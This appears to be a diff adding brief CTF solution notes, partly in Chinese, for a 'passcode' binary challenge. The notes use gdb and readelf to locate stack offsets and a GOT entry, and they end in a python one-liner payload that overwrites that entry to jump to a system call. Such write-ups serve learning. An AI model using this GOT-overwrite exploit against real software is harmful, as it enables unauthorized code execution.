@@ -1,0 +1,9 @@
+1.gdb passcode
+2.看welcome，找到scanf name的位址是ebp-0x70
+3.看login，找到passcode1的位址是ebp-0x10
+4.看login，找到passcode2的位址是ebp-0x0c
+5.readelf -r ./passcode
+6.gdb passcode
+7.disas login，看到system call前的位址是0x080485e3
+8.python -c "print 'a'*96+'\x00\xa0\x04\x08'+'134514147\n'"|./passcode
+
